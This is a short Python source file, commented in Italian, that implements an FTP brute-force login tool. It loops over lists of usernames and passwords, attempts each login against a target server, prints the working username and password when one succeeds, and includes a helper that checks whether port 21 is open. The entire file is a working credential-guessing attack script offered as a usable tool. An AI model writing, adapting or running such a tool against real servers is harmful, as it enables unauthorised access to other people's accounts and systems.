import socket
from ftplib import FTP

class BruteForce:
    def __init__(self, server, username=None, passwords=None, usernames=None):
        self.server = server
        self.username = username
        self.passwords = passwords
        self.usernames = usernames
        self.found = False

    def attempt_login(self, username, password):
        """Tenta il login con un nome utente e una password specifica."""
        if self.found:
            return

        try:
            ftp = FTP(timeout=1)  # Timeout breve per connessioni più rapide
            ftp.connect(self.server)
            ftp.login(user=username, passwd=password)
            self.found = True
            print(f"[SUCCESS] Login riuscito con: {username}:{password}")
            ftp.quit()
        except Exception as e:
            # Stampa il fallimento con la combinazione username e password
            print(f"[FAILED] Tentativo fallito con: {username}:{password}")
            pass  # Ignora errori per evitare ritardi inutili

    def start(self):
        """Avvia il brute force, provando le combinazioni di username e password."""
        if self.username:  # Se l'utente conosce il nome utente
            for password in self.passwords:
                if self.found:
                    break  # Se una password è stata trovata, interrompi il loop
                self.attempt_login(self.username, password)
        else:  # Se l'utente non conosce il nome utente
            for username in self.usernames:
                for password in self.passwords:
                    if self.found:
                        break  # Se una password è stata trovata, interrompi il loop
                    self.attempt_login(username, password)

        if not self.found:
            print("[INFO] Nessuna password trovata.")


def is_server_reachable(server):
    """Verifica se il server è raggiungibile con una connessione socket."""
    try:
        # Tentiamo di connetterci al server sulla porta FTP (21)
        sock = socket.create_connection((server, 21), timeout=5)
        sock.close()
        return True
    except (socket.timeout, socket.error):
        return False
